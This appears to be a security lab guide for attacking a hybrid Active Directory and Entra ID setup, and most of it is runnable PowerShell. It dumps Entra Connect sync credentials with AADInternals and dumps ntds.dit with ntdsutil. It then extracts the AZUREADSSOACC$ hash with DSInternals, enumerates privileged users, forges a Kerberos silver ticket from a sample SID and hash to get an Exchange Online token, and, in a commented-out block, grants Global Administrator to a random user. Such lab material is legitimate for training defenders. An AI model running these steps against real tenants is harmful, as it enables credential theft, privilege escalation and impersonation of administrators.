## lab 2 - Entra Connect Attacks
1. **prepare a victim user with high privileges**: in Entra portal (login with your admin tenant creds), select ***user10*** and assign it with the **Application Administrator** role
    <!-- ```powershell
    # add role randomly
    Import-Module AzureAD
    Connect-AzureAD # use admin tenant creds

    $users = Get-AzureADUser -All $true | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null } | ForEach-Object { $user = $_; Get-AzureADDirectoryRole | ForEach-Object { Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='Role';Expression={$_.DisplayName}} } } | Format-Table -Wrap -AutoSize
    
    $randomUser = $users | Get-Random
    
    $role = Get-AzureADDirectoryRole | Where-Object { $_.DisplayName -eq "Global Administrator" }
    
    # Assign the role to the random user
    Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $randomUser.ObjectId

    ``` -->
2. Dumping and Extracting Entra (Azure AD) Connect credentials:
    1. run powershell as admin on the server where Entra Connect is installed
    2. execute:
        ```powershell
        Import-Module AADInternals
        Get-AADIntSyncCredentials
        ```


3. reset password


## 3. Silver Ticket Attack ##
1. get Sync's SID:
    ```powershell
    # Dump NTDS.dit and registry:
    ntdsutil "ac i ntds" "ifm” "create full C:\temp" q q
    # Now the AD and registry are dumped to C:\temp and we can extract the password hash using DSInternals.

    # use DSInternals
    Import-Module DSInternals

    # Get the Boot key
    $key = Get-BootKey -SystemHivePath 'C:\temp\registry\SYSTEM'

    # Get the password hash of AZUREADSSOACC
    (Get-ADDBAccount -SamAccountName 'AZUREADSSOACC$' -DBPath 'C:\temp\Active Directory\ntds.dit' -BootKey $key).NTHash | Format-Hex
    # remote the empy spaces and keep the hash

    # Find victim user to impersonate
    Import-Module AzureAD
    Connect-AzureAD # use the dumped Entra Connect creds
    # list users with roles
    Get-AzureADUser -All $true | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null } | ForEach-Object { $user = $_; Get-AzureADDirectoryRole | ForEach-Object { Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='Role';Expression={$_.DisplayName}} } } | Format-Table -Wrap -AutoSize

    ```
    


    Obtain Sync_xx user’s SID  (by running mimikatz / other credentials dump tool or alternatively extract the plain text credentials on the server that is running Entra Connect, or alternatively using DCSync)​

    Generate a Kerberos ticket for the synced user that we wish to impersonate, using its SID + NTLM hash of the AZUREADSSOACC$ machine account:​
    $kerberos=New-AADIntKerberosTicket -SidString "S-1-5-21-722990657-2348522304-2045722228-1120" -Hash "6540a1298884fb7d186afdc9e29f1bb7"​

    Obtain an access token to a specific resource using that Kerberos ticket:​
    $at=Get-AADIntAccessTokenForEXO -KerberosTicket $kerberos -Domain xspm-research.net



    # detect of SSO is enabled:
    ```powershell
    $body = @{
        "username" = "user10@mydomain.onmicrosoft.com"
    } | ConvertTo-Json

    $response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Method Post -Body $body -ContentType "application/json"
    $response
    ```